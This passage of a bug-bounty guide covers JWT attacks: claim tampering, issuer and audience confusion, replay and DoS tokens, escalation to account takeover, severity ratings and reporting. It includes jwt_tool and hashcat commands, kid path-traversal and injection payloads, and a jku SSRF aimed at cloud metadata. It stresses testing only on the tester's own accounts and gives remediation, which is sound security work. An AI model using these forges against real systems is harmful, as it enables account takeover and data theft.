Once you can forge (Part II) **or** when the signature isn't verified (§5), the claims are yours. Even *without* a forge primitive, always test whether the server **trusts claims it shouldn't** (e.g. it re-reads `role` from the token instead of the DB).

```
High-value claims to tamper and observe:
  sub / user_id / uid / account_id   → set to another user's id → horizontal takeover/IDOR (§24)
  role / roles / isAdmin / admin      → escalate to admin/staff (§25)
  scope / scopes / permissions        → add scopes (read→write, user→admin API)
  groups / authorities                → join privileged groups
  tenant / org / company_id           → cross-tenant access (§26)
  email / email_verified              → OAuth ATO (set verified:true, swap email) (§27)
  amr / acr / mfa                      → claim MFA satisfied without doing MFA
  plan / tier / entitlement            → unlock paid features (business-logic)
```
**Method:** change one claim at a time, re-sign with your forge primitive (or send tampered-only if signature isn't checked), and confirm the **server's behavior changed** (you see another user's data / admin functions / extra scopes). Behavior change = the finding; a token that's accepted but ignored is not (§29).

---

# 16. Issuer / Audience Confusion & Cross-Service Reuse

Multi-service and OAuth systems issue tokens for specific **audiences** (`aud`) and **issuers** (`iss`). Weak validation lets a token meant for service A be replayed at service B, or a token from a *different* (attacker-registered) issuer be accepted.

```
□ aud not validated:  a low-priv API's token accepted by a high-priv API (privilege crossover).
□ iss not validated:  token from another tenant/issuer accepted (esp. shared-IdP SaaS).
□ Same signing key across environments: a STAGING/UAT token accepted in PRODUCTION.
□ OAuth "confused deputy": id_token for your client accepted by a different client/relying party.
□ Public multi-tenant IdP (e.g. shared Azure AD/Auth0 tenant): tokens from ANY tenant validate
  unless aud+iss+tenant are strictly pinned → cross-tenant auth bypass.
```
Test by taking a **valid token from one context** (a second app, a staging env, your own OAuth client) and replaying it at the target endpoint. Acceptance across audiences/issuers is a real, often **High–Critical**, finding.

## 16.1 OpenID Connect (OIDC) `id_token`-specific attacks
OIDC `id_token`s carry extra security claims that relying parties (RPs) routinely fail to validate — each gap is a distinct, high-value bug:
```
□ aud as an ARRAY:        aud can be a list; the RP must check ITS client_id is present AND check azp when multiple.
                          If it accepts any aud containing a value → a token for ANOTHER client is accepted (confused deputy).
□ azp not validated:      with multiple audiences, "azp" (authorized party) must equal the RP's client_id — often ignored.
□ nonce missing/replayed: the RP must bind the id_token to the nonce it sent. No nonce check → REPLAY an id_token /
                          inject a stolen one → sign-in as the victim (authorization-code/implicit flows).
□ at_hash / c_hash not validated:  these bind the id_token to the access_token / auth code. If unchecked, an attacker can
                          SUBSTITUTE a different access_token/code (token-substitution / "cut-and-paste") → account mix-up.
□ IdP "mix-up" attack:    in multi-IdP RPs, swap which IdP the response came from → the RP exchanges the code at the wrong
                          IdP / accepts a token from the wrong issuer → ATO. (Validate iss per IdP + per-request state.)
□ id_token used AS an access_token:  some APIs accept the id_token at protected/userinfo endpoints → audience misuse.
□ Implicit-flow token leakage:  id_token in the URL fragment leaks via Referer/history (cross-ref §19).
□ "sub" + "iss" identity:  the RP must key the account on (iss, sub) PAIR — keying on email/sub alone → cross-IdP takeover
                          (register the victim's email at an IdP you control whose tokens the RP trusts).
```
> **If this → then that:** the app is an **OIDC relying party** → don't stop at "aud/iss" — test **nonce replay** (re-send an id_token), **at_hash/c_hash substitution**, **azp/aud-array** acceptance, and whether the account is keyed on the **(iss, sub) pair**. A missing nonce or at_hash check is a clean **sign-in-as-victim** (High–Critical). Use **your own** IdP test client + a second test account.

---

# 17. Expiration, Replay & Revocation Failures

Lifecycle bugs are payable when they yield **persistent or stolen-token access**.

```
□ exp not enforced:    set exp far in the future (or remove it) on a forged token, or use an old
                       captured token past its exp → still accepted → forever-session.
□ No exp at all:        tokens never expire → a single capture = permanent access.
□ nbf bypass:           set nbf in the past to use a not-yet-valid token.
□ No jti / replay:      same token (esp. one-time reset/magic-login JWT) reused multiple times.
□ No revocation on logout / password change:
                       capture a token, log out (or change password), replay it → still valid → stolen
                       tokens survive the user's defensive action. (Very common, clearly reportable.)
□ Clock-skew abuse / long leeway: huge acceptable skew lets expired tokens through.
```
**PoC pattern:** capture a token, perform the user action that *should* invalidate it (logout / password reset), then replay it on an authenticated endpoint and show it still returns the user's data.

---

# 18. Refresh-Token & Session Lifecycle Abuse

```
□ Refresh token doesn't rotate:        same refresh token re-mints access tokens indefinitely.
□ Refresh token not revoked on logout: stolen refresh token = persistent ATO (worst case).
□ Access token outlives refresh revoke: revoking refresh doesn't kill live access tokens.
□ Refresh token in a readable place:   localStorage/URL (chain with XSS, §27/§19) → long-lived ATO.
□ No reuse-detection:                  replaying a rotated (already-used) refresh token still works.
```
A stolen/forged **refresh** token is more severe than an access token (re-mints indefinitely) — call that out explicitly; it raises severity (§30).

---

# 19. JWT Storage & Leakage

Where the token lives decides how it gets stolen and how long it lasts.

```
□ In URL / query / fragment:   leaks via Referer header, browser history, server logs, proxies,
                               analytics. A reset/magic-login JWT in a URL is a classic leak.
□ In localStorage/sessionStorage: JS-readable → any XSS steals it (chain, §27). HttpOnly doesn't apply.
□ Logged server-side / in error pages / stack traces: tokens printed to logs accessible to others.
□ Cached responses / CDN:      tokens in cacheable responses served to other users.
□ Cookie flags:                missing HttpOnly/Secure/SameSite on a JWT cookie → theft/CSRF.
□ exp very long + stored client-side: a single theft = long-lived access.
```
Leakage alone is often **Low–Medium**, but it's the **enabler** for ATO when chained (XSS→token theft, Referer leak of a reset token). Report the *resulting* account compromise where you can demonstrate it.

---

# 20. JWE / Nested / Encrypted-JWT Issues

JWE (5 parts) is *encrypted*. Issues are different from JWS:
```
□ alg:dir / weak key management:   guessable/static content-encryption key.
□ RSA1_5 (PKCS#1 v1.5) key wrapping → Bleichenbacher / Million-Message style padding-oracle (if errors differ).
□ "alg":"none" inside a nested JWS payload of a JWE (decrypt → inner unsigned token trusted).
□ Decryption errors that leak (oracle) → recover the key over many requests.
□ Mixing up signing vs encryption keys.
```
Rarer in bounty, but if you see 5-part tokens, note the `alg`/`enc`, test for nested `none`, and watch for distinguishable padding-oracle responses.

## 20.1 JWT / JWE Denial-of-Service (only where DoS is in scope)
Some JWT/JWE features let one tiny token consume huge CPU/memory on the verifier — a resource-exhaustion DoS. **Only test where DoS is explicitly in scope, and demonstrate the *ratio* on a single request — never sustain it against production.**
```
□ PBES2 high iteration count (JWE alg=PBES2-*):  the header "p2c" (PBKDF2 iteration count) is attacker-set. A token with
   p2c = 10,000,000+ forces the server to run millions of PBKDF2 rounds per verification → CPU exhaustion (one request
   can hang a worker). Classic "p2c bomb."
□ Oversized embedded key (jwk/x5c) or huge RSA modulus:  a multi-thousand-bit RSA public key in jwk → expensive verify.
□ JWE "zip":"DEF" decompression bomb:  a tiny compressed payload that expands to gigabytes on decrypt → memory blowup.
□ Deeply nested JWT (JWE(JWS(JWE(...)))) / billion-laughs-style JSON:  recursive parsing/verification cost.
□ Very long token / many header params:  parser cost on pathological input.
```
> **If this → then that:** the verifier accepts **JWE** (PBES2) or decompresses (`zip:DEF`), or trusts an attacker-supplied `p2c`/key size → a **single crafted token** can exhaust a worker (a measurable multi-second hang or memory spike) → DoS. Demonstrate the cost of *one* request and the ratio; **don't** flood production. Report only where DoS is in scope (CWE-400).

---

# 21. Header-Injection & Parser Confusion

```
□ Duplicate header keys:   two "alg" entries → which one does the verifier vs the forger use?
                           (e.g. {"alg":"RS256","alg":"none"}) → confusion/none acceptance.
□ Duplicate claims:        two "role" entries → last-wins vs first-wins mismatch between gateway & app.
□ typ/cty confusion:       set typ to an unexpected value; cty for nested content confusion.
□ JSON quirks:             unicode escapes, leading zeros, big numbers, comments — parser-dependent
                           acceptance differences between the auth layer and the resource server.
□ Whitespace/case in alg:  "none " / "None" / "RS256" to slip blocklists (§6.2).
□ Critical header (crit):  per spec, a verifier MUST reject a token whose "crit" lists a header param it doesn't
                           understand. Two abuses: (a) a lib that IGNORES "crit" lets you smuggle a param the
                           verifier should have rejected (bypass a required check); (b) listing a "crit" param the
                           gateway honors but the backend ignores → gateway-vs-backend divergence.
```
Parser-confusion shines in **gateway + microservice** setups where two different JWT libraries parse the same token differently — the gateway authorizes on one interpretation, the backend acts on another.

---

# PART IV — IMPACT (where the money is)

> Parts I–III get you a forged/abused token. Part IV turns it into a payout. **Every demonstration uses YOUR OWN test accounts** — forge into your own second account or a test admin you control; never impersonate or access a real user (§32).

# 22. The Escalation Mindset

A triager's first question on any JWT finding is **"so what can you actually do?"** Answer with one of these, in descending value:

```
1. Forge a token for ANY user / an ADMIN → full auth bypass / ATO / admin       → Critical
2. Tamper sub → access/act as another specific user (IDOR)                        → High–Critical
3. Tamper role/scope → vertical priv-esc to admin/staff                           → Critical
4. Cross-tenant token acceptance → read/modify another tenant's data              → Critical (SaaS)
5. Stolen/forged refresh token → persistent ATO                                   → High–Critical
6. Replay after logout / no-exp → durable session from a captured token           → Medium–High
7. jku/x5u SSRF → internal reach / metadata                                       → Medium–High (+ATO if key honored)
8. Token info-leak / weak storage with a demonstrated theft chain                 → Medium
9. "Token contains email", "HS256 used", "alg:none in spec" with no forge         → Info (don't lead)
```
Climb as high as the app allows and **demonstrate** it. The forge is the *door*; the report is what's behind it (admin, other users, the whole tenant).

---

# 23. Authentication Bypass & Full Account Takeover

The headline outcome of Part II. With a forge primitive (none/confusion/crack/key-injection) you mint a token for **an arbitrary user**:
```
1. Take a valid token from YOUR account; change sub/user_id (and email if needed) to the VICTIM's id.
2. Re-sign with your forge primitive (empty key for none/kid-devnull; public key for RS→HS;
   cracked secret for HS; your private key for jwk/jku/x5c).
3. Send it to an authenticated endpoint → you are now the victim with no credentials.
```
**Demonstrate** on your own two accounts: forge a token for test-account-B from test-account-A's session, call `GET /api/me` (or load the dashboard), and show B's data returned. That's an unambiguous **Critical** (pre-auth ATO of any user).

---

# 24. Horizontal Privilege Escalation (IDOR via `sub`)

Even without a *signature* break, if the server **authorizes based on a claim it trusts** (and you can forge, or it doesn't verify), swapping `sub`/`user_id` to another user's identifier yields **horizontal** access:
```
sub: 1001 (you)  →  sub: 1002 (victim)   → re-sign → you now operate AS user 1002.
```
- Quantify scale: are ids sequential/enumerable? Can you iterate all users? Mass-IDOR = **Critical**.
- Capture evidence: the response containing **another** user's PII/financial data, proven not yours (different name/email/amount).

---

# 25. Vertical Privilege Escalation (user → admin)

Bump a privilege claim and re-sign:
```
role: "user"  → "admin" / "superadmin" / "staff"
isAdmin: false → true
scope: "read"  → "read write admin"
groups: [...]  → add "administrators"
```
Then access an admin-only endpoint/UI. If the server trusts the token's role (rather than re-checking server-side), you now have **admin** = Critical (manage users, read all data, change roles, multi-tenant).

> **Test even if you can't forge yet:** some servers verify the signature but *also* re-derive privileges from the DB — in which case role-tamper is ignored (good). Others trust the token's role. The only way to know is to try and watch behavior (§5.2).

---

# 26. Cross-Tenant / Multi-Tenant Compromise

In SaaS, the catastrophic outcome. Combine `aud`/`iss`/`tenant` confusion (§16) or a forge primitive with a tenant claim swap:
```
tenant: "acme"  → "globex"     → re-sign → read/modify Globex's data while authenticated as Acme.
```
Or replay a valid token across tenants when the IdP is shared and `aud`/`iss`/`tid` aren't pinned. Demonstrate reading **another tenant's** record (your own second tenant, ideally) → **Critical** (multi-tenant data breach).

---

# 27. Chaining JWT with Other Bugs

JWT bugs combine for outsized impact:
```
□ XSS  →  steal JWT from localStorage  →  use/replay as victim (§19 + the XSS guide §25).  → ATO
□ jku/x5u SSRF  →  reach cloud metadata (169.254.169.254) → steal cloud creds  →  infra compromise.
□ OAuth + JWT  →  tamper email/email_verified in id_token  →  account linking takeover / login-as-victim.
□ Open redirect on a trusted host  →  satisfy jku host allow-list  →  key spoof (§11.2).
□ Reset-token JWT (in email link) forgeable/replayable  →  reset ANY user's password  →  mass ATO.
□ SQLi in kid  →  DB read AND key control  →  forge + data exfil.
□ Weak secret leaked in a public git repo / mobile app (.env, source)  →  forge tokens (recon win).
```
The reset-password-JWT chain and the XSS→token-theft chain are the two most common high-payout combinations — always check whether email/reset/verify links are JWTs (§4.1).

---

# PART V — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)

> Parts I–IV teach you to find and escalate. Part V teaches you to get **paid** and avoid the "Informational/Not-Applicable" close. The #1 reason a JWT report underpays is reporting a **property** ("uses HS256", "exposes claims", "alg:none exists in the standard") instead of an **impact** ("here is a forged admin token the server accepted").

# 28. The Validity-First Mindset for JWT

## 28.1 The four questions a triager asks (answer them *in your report*)
1. **Did you forge a token the server *accepted* on an authz-bearing request?** Or did you only decode/observe one? Acceptance of attacker-controlled content is the bug; reading a token is not.
2. **What concrete thing does the forged/abused token *do*?** Access another user, become admin, cross a tenant, persist after logout. Name the outcome.
3. **What does the attacker need?** Pre-auth/any-user (no creds) > needs a low-priv account > needs a captured token > needs the victim rooted/MITM'd. Fewer prerequisites = higher severity.
4. **Is it reproducible & in scope?** Production endpoint, copy-pasteable forge command + the accepted request/response.

## 28.2 The "property vs accepted-forgery" rule (most important)
| You have | Standalone verdict | Becomes valuable when… |
|---|---|---|
| Decoded a JWT, it contains email/role | Info | …the data is a real secret it shouldn't carry, or it enables a forge. |
| "Server uses HS256" | Info | …you actually **crack** the secret and forge (§7). |
| "alg:none is supported by the spec" | Info | …the **server accepts** an unsigned token you forged (§6). |
| `jku`/`jwk` header present | Info | …the server **fetches/trusts** your key and accepts your token (§11/§12). |
| JWT in localStorage | Low | …you demonstrate theft (XSS) + reuse as the victim (§27). |
| Token still valid after logout | Medium | …it's a realistic stolen-token persistence scenario with impact. |
| Tampered `role` accepted | **Critical** | …it actually grants admin behavior (not just "accepted but ignored"). |

## 28.3 Production-scope discipline
- Confirm on the **production** issuer/endpoint with the **production** keys. A forge that only works against staging (shared key, debug config) may be out of scope — unless the *same key is reused in prod* (which is itself the finding, §16).
- Re-test after a fix: partial fixes (blocking `none` but not key-confusion; pinning `jku` host but allowing open-redirect bypass) are common and are fresh, valid findings.

## 28.4 One-CWE, one-root-cause mapping
Collapse symptoms to the root cause. "Accepts `none`" and "accepts `jwk`" and "accepts RS→HS" are often the **same** underlying flaw (verifier trusts the token's algorithm/key) — but if they're independently exploitable, report the **most impactful** one as the headline and note the others. Don't split one forge into five reports.

---

# 29. False Positives — STOP reporting these (auto-reject list)

These destroy credibility. Each has a *narrow* condition under which it becomes real.

| # | Commonly mis-reported as a JWT vuln | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **"JWT is not encrypted / I can read the claims"** | JWS is signed, **not** encrypted — by design. Reading claims is expected. | If it carries a true secret (password, PAN, another user's PII) that shouldn't be client-side. |
| 2 | **"Uses HS256 (symmetric)"** | A valid, common choice. Not a vuln. | Only if you **crack** the secret and forge (§7). |
| 3 | **"`alg:none` is in the RFC"** | The spec defining it ≠ the server accepting it. | If the **server accepts** an unsigned forged token (§6). |
| 4 | **"Token doesn't expire quickly / long exp"** | A config tradeoff; low impact alone. | If combined with leakage/no-revocation and a demonstrated stolen-token reuse (§17). |
| 5 | **Tampered claim "accepted" but behavior unchanged** | Server re-derives authz from DB; your edit is ignored. **Not** exploitable. | Only if the tampered claim **changes server behavior** (you get admin/other-user data, §5.2). |
| 6 | **`jku`/`jwk`/`kid` header *present*** | Presence ≠ the server trusting attacker keys. | If the server **fetches/uses** your key and accepts your token (§10–§12). |
| 7 | **Expired/invalid token correctly rejected** | That's the control working. | n/a (it's secure behavior). |
| 8 | **"No `jti`/replay" with no sensitive single-use token** | Replaying your own normal session token is not impact. | One-time tokens (reset/magic-login/OTP-JWT) replayable, or cross-user replay. |
| 9 | **Decoded a token found in your own browser storage** | Self-knowledge of your own token isn't a vuln. | If another user's token is exposed to you, or yours is stealable (XSS chain). |
| 10 | **Weak secret cracked from a *self-issued/example* token** | Cracking a demo/staging key that prod doesn't use proves nothing. | The **production** signing secret is weak and you forge a prod-accepted token. |
| 11 | **"HS256 vs RS256 best-practice" hardening note** | Advice, not a vulnerability. | Only as remediation text inside a real finding. |

> Rule of thumb: if you can't show **"I sent a token I controlled and the server treated it as a valid, more-privileged/other-user identity,"** you don't have a reportable JWT bug yet — you have an observation. Keep escalating or drop it.

---

# 30. Severity Calibration — how triagers really rate JWT bugs

Set a severity you can **defend** with a CVSS vector. "Alone" = the finding itself; "Chained" = realistic uplift.

| JWT scenario | Typical alone | Realistic chained | What moves it |
|---|---|---|---|
| **Forge any/admin token** (none/RS→HS/crack/jwk/jku/kid) → auth bypass | **Critical** | Critical | Pre-auth, any user, no creds = top tier. |
| **Signature not verified at all** | **Critical** | Critical | Trivial full forge. |
| **`sub` swap → access another user (IDOR)** | **High** | Critical (mass) | Up if ids enumerable / financial-PII / bulk. |
| **`role`/`scope` tamper → admin** (server trusts it) | **Critical** | Critical | Admin actions / all-user data. |
| **Cross-tenant token acceptance** (SaaS) | **Critical** | Critical | Multi-tenant data breach. |
| **`jku`/`x5u` SSRF** (key not honored) | **Medium–High** | High–Critical | Up if reaches metadata/internal (cloud creds). |
| **Forged/stolen refresh token** → persistent access | **High–Critical** | Critical | Re-mints indefinitely. |
| **Token valid after logout / password change** | **Medium** | High | Realistic stolen-token persistence. |
| **No `exp` / very long, stored client-side** | **Low–Medium** | Medium–High | With a theft/leak chain. |
| **JWT leaked in URL/Referer/logs** | **Low–Medium** | High | If it's a reset/auth token enabling ATO. |
| **Reset/magic-login JWT forgeable or replayable** | **High–Critical** | Critical | Mass ATO via password reset. |
| **Info-leak claims / HS256 note / alg:none-in-spec** | **Info** | — | Never lead with these. |

**CVSS pointers (v3.1):**
- Forge-any-user auth bypass: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` → Critical (~9.x). `S:C` (scope change) is defensible — one component's token grants identity across the system.
- `sub`-swap IDOR (needs a low-priv account): `PR:L`, `C:H/I:L` → High.
- Anchor to a CWE: **CWE-347** (Improper Verification of Cryptographic Signature) for forge/none/confusion; **CWE-345** (Insufficient Verification of Data Authenticity) for trust issues; **CWE-287/CWE-863** for auth/authz bypass; **CWE-639** for `sub`-IDOR; **CWE-918** for `jku` SSRF.

---

# 31. Impact-Escalation Playbooks — "you found X, now do Y"

Each: **trigger → escalation steps → evidence to capture → resulting severity.** Live in this section.

### 31.1 You found: *the signature isn't verified* (baseline §5)
- **Escalate:** tamper `role`→admin and/or `sub`→victim, keep/strip the signature, hit an authed endpoint. You can mint anything.
- **Evidence:** the tampered-token request + a response showing admin/other-user data.
- **Severity:** **Critical** (full forge).

### 31.2 You found: *`alg:none` accepted* (§6)
- **Escalate:** forge an admin/any-user token (empty signature). Demonstrate ATO.
- **Evidence:** the unsigned forged token accepted on an authz request.
- **Severity:** **Critical**.

### 31.3 You found: *HS256 with a weak secret* (§7)
- **Escalate:** crack it (hashcat `-m 16500`), re-sign tampered claims (`sub`/`role`), demonstrate ATO/admin.
- **Evidence:** the cracked secret (or hashcat output), the forged token, the accepted authed response.
- **Severity:** **Critical**.

### 31.4 You found: *RS256 and a published/recoverable public key* (§8/§9)
- **Escalate:** RS→HS confusion: HMAC-sign with the public-key PEM (try formatting variants via `poc/rs256_to_hs256.py`). If no JWKS, recover (n,e) from two tokens (§9).
- **Evidence:** forged HS256 token (signed with the public key) accepted as valid.
- **Severity:** **Critical**.

### 31.5 You found: *`jku`/`x5u`/`jwk`/`x5c` honored from the token* (§11–§13)
- **Escalate:** host your JWKS (or embed your `jwk`/`x5c`), sign with your private key, forge admin/any-user. Also confirm the **SSRF** callback for `jku`/`x5u` (may reach metadata, §27).
- **Evidence:** forged token accepted; Collaborator hit proving the server fetched your URL.
- **Severity:** **Critical** (forge) and/or **High** (SSRF).

### 31.6 You found: *`kid` is injectable* (§10)
- **Escalate:** path-traversal to `/dev/null` (empty key → sign HS with `""`); SQLi to return a known key; test command-injection/LFI for RCE.
- **Evidence:** forged token via the controlled key; or SQLi/command-injection proof.
- **Severity:** **Critical** (forge) / High–Critical (SQLi/RCE).

### 31.7 You found: *`sub`/`role`/`tenant` tamper is trusted* (§15/§24/§25/§26)
- **Escalate:** swap to another user / admin / another tenant; confirm behavior change; quantify scale (enumerable ids, multi-tenant).
- **Evidence:** another user's / admin's / tenant's data in the response, proven not yours.
- **Severity:** **High–Critical**.

### 31.8 You found: *token survives logout / no exp / replayable reset-JWT* (§17/§18)
- **Escalate:** capture → invalidate (logout/reset) → replay → still works. For reset-JWTs, forge/replay to reset **another** user's password.
- **Evidence:** the replayed token returning data after the invalidating action; or a completed reset of your second account via a forged reset token.
- **Severity:** Medium–High; **Critical** for mass-ATO reset chains.

### 31.9 You found: *JWT in localStorage/URL* (§19)
- **Escalate:** demonstrate the theft path (XSS → exfil, or Referer leak of a reset link) and **reuse** the token as the victim.
- **Evidence:** stolen token used to access the victim's (your test) account.
- **Severity:** Low alone → **High** with the demonstrated chain.

---

# 32. Building a Professional, Safe PoC

A good JWT PoC is **unambiguous, reproducible, and harmless to real users.**

## 32.1 Prove the right thing
- Show a **forged token the server accepted** on an **authz-bearing** request, with the request **and** the response that proves elevated/other identity (admin panel data, `GET /me` returning the victim test-account).
- Include the **exact forge command** (jwt_tool / `poc/` script) so anyone reproduces it.

## 32.2 Make it safe (critical for legality & scope)
```
DO:
  □ Forge into YOUR OWN second test account (sub/role of an account you control), or a test admin.
  □ For "any user" claims, use your own two accounts (A forges B's id; both are yours).
  □ Keep actions read-only / reversible; revert any change (e.g. a test password reset).
  □ Use your own collaborator for jku/SSRF callbacks.
DON'T:
  □ Forge a token for a REAL user / access real users' data.
  □ Actually take over real accounts, reset real users' passwords, or read real tenant data.
  □ Brute-force production at high volume (secret-cracking is OFFLINE — do it on a captured token locally).
  □ Leave forged-admin sessions or test artifacts behind.
```
> Secret cracking is **offline** — capture one token and crack it on your machine; you don't hammer the server. That keeps the PoC quiet and in-bounds.

## 32.3 Capture the evidence triagers want
- The original token (decoded), the **forged** token (decoded), the **exact change** you made.
- The HTTP request with the forged token and the **response proving impact**.
- The forge command/script. For `jku`/SSRF: the collaborator log.

## 32.4 Provide remediation
Verify the signature with a **server-pinned key and a server-fixed algorithm** (never trust `alg`/`jku`/`jwk`/`x5c`/`kid` from the token); reject `none`; use strong RS/ES keys (or a strong, rotated HS secret); validate `exp`/`nbf`/`aud`/`iss`; bind tokens to a session and revoke on logout/password-change; short `exp` + rotating refresh with reuse-detection. Naming the fix speeds resolution.

---

# 33. Reporting, CWE/CVSS & De-duplication

Use the full skeleton in `JWT_REPORT_TEMPLATE.md`. Minimum a report must contain:
```
1. Title          "JWT algorithm confusion (RS256→HS256) → forge any user's token → full account takeover"
                  (name the IMPACT, not "JWT misconfig")
2. Severity       CVSS 3.1 vector + score + one CWE (CWE-347 / CWE-345 / CWE-287 / CWE-639 / CWE-918)
3. Affected asset Exact prod endpoint + which token + algorithm + the header/claim abused
4. Summary        One paragraph: which verification step breaks, the forge primitive, the impact.
5. Steps to repro Numbered, copy-pasteable: capture token → forge command → accepted request.
6. PoC            Original + forged token (decoded) + the forge command + request/response proof.
7. Impact         The escalation demonstrated (ATO / admin / cross-tenant) — the "so what".
8. Remediation    Pin key+alg server-side; reject none/untrusted key headers; validate claims; revoke.
```
**De-dup:** one root cause (verifier trusts token-supplied alg/key) = one finding even if several headers exploit it; lead with the most impactful. Don't split a single forge into multiple reports.

---

# 34. Automation & Scaling

Automation finds candidates; manual work confirms acceptance and builds impact.
```bash
# 1) jwt_tool "playbook" against a live authed request (it tries none/confusion/kid/etc. and reports acceptance)
python3 jwt_tool.py -t https://target.com/api/me -rh "Authorization: Bearer <TOKEN>" -M at

# 2) jwt_tool all-tests scan mode
python3 jwt_tool.py <TOKEN> -M pb    # probe a bunch of common bypasses

# 3) Mass HS256 cracking on captured tokens
hashcat -a 0 -m 16500 tokens.txt rockyou.txt jwt.secrets.list

# 4) Burp JWT Editor: per-request manual forging (none / embedded jwk / key confusion) — the workhorse for verification
# 5) Public-key recovery from two tokens when no JWKS (silentsignal/rsa_sign2n)
```
- **Quality gate:** never submit "jwt_tool said vulnerable." Reproduce the **accepted forged request**, confirm the **behavior change** (§5.2), and build the **impact** (§31). A confirmed forge beats 100 "possible" flags.

---

# 35. Case Studies & Real-World Chains

**A) RS256 → HS256 confusion → forge any user → full ATO.**
App used RS256; the JWKS was public at `/.well-known/jwks.json`. Switching `alg` to HS256 and HMAC-signing with the **exact public-key PEM** (the trailing-newline variant) produced a token the server accepted. Changing `sub` to any user id logged in as them with no credentials. Lesson: the public key being public is the *whole* problem when the verifier trusts the token's `alg`. **Critical.** (`poc/rs256_to_hs256.py`.)

**B) `kid` path traversal to `/dev/null` → empty-key forge.**
`kid` was used to read a key file. `kid:"../../../../dev/null"` made the server load an **empty** key; signing HS256 with secret `""` verified. Forged an admin token → admin panel. Lesson: any file-path-from-token is a forge primitive; `/dev/null` is the universal "known key." **Critical.** (`poc/kid_injection.py`.)

**C) Reset-password JWT forgeable → mass account takeover.**
The password-reset link carried a JWT (`{sub, action:"reset"}`) signed with a weak HS256 secret (`secret`). Cracked offline, then forged a reset token for **any** user id → reset anyone's password. Lesson: **always decode email/reset/verify links** — they're often JWTs, and they're the highest-impact forge target (mass ATO). **Critical.** (`poc/forge_token.py`.)

**D) `jku` honored + open redirect → key spoof + SSRF.**
The verifier fetched `jku` but required the host to match the issuer domain. An open redirect on that domain (`/out?url=`) let the fetch land on the attacker JWKS. Tokens signed with the attacker's private key were accepted; the same fetch also hit an internal Collaborator → SSRF. Lesson: `jku` allow-lists fall to open redirects; you often get **two** findings. **Critical + High.** (`poc/jwks_server.py`.)

**E) Tampered `role` "accepted" but ignored — correctly NOT reported.**
A token with `role:admin` was accepted, but the app re-derived privileges from the DB, so nothing changed. Recognized as a **non-finding** (§29.5) and dropped rather than reported as "privilege escalation." Lesson: acceptance ≠ impact; verify behavior change before claiming priv-esc.

> **Common thread:** in every real payout the win was a **forged token the server *acted on*** — admin, another user, mass reset. The crypto was the door; the report was the impact behind it.

---

# Appendix A — JWT Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────┐
│                       JWT HUNTING WORKFLOW                      │
├────────────────────────────────────────────────────────────────┤
│ 0. SCOPE + LAB                                                 │
│    └→ jwt_tool · Burp JWT Editor · hashcat · attacker JWKS host │
│ 1. RECON / DECODE                                              │
│    ├→ find EVERY token (cookie/Bearer/URL/body/reset-link)     │
│    ├→ decode header+payload: alg · kid · jku/x5u/jwk/x5c       │
│    └→ note claims: sub · role/scope · aud · iss · exp · jti    │
│    └→ grab JWKS: /.well-known/jwks.json , openid-configuration  │
│ 2. BASELINE  ★ is the signature even verified?                 │
│    ├→ tamper a claim, keep sig → accepted? = no verify (Crit)  │
│    ├→ strip sig (header.payload.) → accepted?                  │
│    └→ confirm BEHAVIOR changed (not just accepted)            │
│ 3. SIGNATURE/KEY ATTACKS  ⭐ forge an accepted token            │
│    ├→ alg:none (none/None/NONE)        §6                      │
│    ├→ crack HS256 (hashcat -m 16500)   §7                      │
│    ├→ RS256→HS256 (sign w/ pubkey)     §8  (recover key §9)    │
│    ├→ kid inject (../dev/null, SQLi)   §10                     │
│    ├→ jku/x5u → your JWKS (+SSRF)      §11                     │
│    ├→ jwk / x5c embedded key           §12/§13                │
│    └→ ES256 psychic sig (Java)         §14                     │
│ 4. CLAIM / LIFECYCLE                                           │
│    ├→ sub→IDOR · role→admin · tenant→cross-tenant  §15/24/25/26│
│    ├→ aud/iss confusion · cross-service reuse      §16         │
│    └→ exp/replay/logout-revoke · refresh abuse     §17/§18     │
│ 5. IMPACT  ⭐ (the money)                                       │
│    ├→ forge any/admin token → ATO       §23                    │
│    ├→ sub swap → other user (IDOR)      §24                    │
│    ├→ role/scope → admin                §25                    │
│    ├→ tenant → cross-tenant breach      §26                    │
│    └→ chain: XSS→token theft · jku→SSRF·reset-JWT  §27         │
│ 6. VALIDATE → SEVERITY → REPORT                                │
│    ├→ false-positive filter (§29) · CVSS+CWE-347 (§30)         │
│    ├→ SAFE PoC: own accounts, offline crack (§32)             │
│    └→ de-dup → submit with IMPACT in the title                │
└────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Attack Decision Tree

```
Decode the token. What is header.alg ?
│
├─ none / None / NONE ........... try alg:none forge (§6). Accepted? → Critical.
│
├─ HS256 / HS384 / HS512 (symmetric)
│     ├─ crack the secret (hashcat -m 16500, default-secrets first) (§7)
│     ├─ if RS-expected elsewhere, this MIGHT be a confusion result — check
│     └─ cracked? → re-sign any claims → ATO/admin (Critical)
│
├─ RS256 / PS256 (asymmetric RSA)
│     ├─ got the public key? (JWKS / cert / recover from 2 tokens §9)
│     ├─ RS256→HS256 confusion: HMAC-sign with the pubkey PEM (§8)  ⭐ try first
│     ├─ jwk header honored?  embed your key (§12)   ⭐ easy, no hosting
│     ├─ jku/x5u honored?     host your JWKS (+SSRF) (§11)
│     └─ x5c honored?         self-signed cert (§13)
│
├─ ES256 (ECDSA) ............... test psychic signature on Java (r=s=0) (§14)
│
└─ Has a kid header? ........... fuzz kid: ../dev/null (empty key), SQLi, cmd-injection/LFI (§10)

ALWAYS, regardless of alg:
  - BASELINE: is the signature verified at all? (§5)  ← do this FIRST
  - Tamper sub/role/aud/iss/tenant → does behavior change? (§15/§16)
  - exp enforced? token revoked on logout? replayable? (§17/§18)
  - token in URL/localStorage? reset/verify links = JWTs? (§19/§27)
Then: did a FORGED token get ACCEPTED & ACTED ON?  → go to IMPACT (Part IV) → report.
```

---

# Appendix C — Important Links

```
RFC 7519 (JWT) / 7515 (JWS) / 7516 (JWE) / 7517 (JWK) / 7518 (JWA)
PortSwigger — JWT attacks (Web Security Academy)   https://portswigger.net/web-security/jwt
PortSwigger — JWT cheat sheet                      https://portswigger.net/web-security/jwt/cheat-sheet
jwt_tool (ticarpi) + wiki                          https://github.com/ticarpi/jwt_tool/wiki
Burp JWT Editor extension                          https://github.com/portswigger/jwt-editor
hashcat JWT mode 16500                             https://hashcat.net/wiki/
rsa_sign2n — RS256 pubkey recovery (silentsignal)  https://github.com/silentsignal/rsa_sign2n
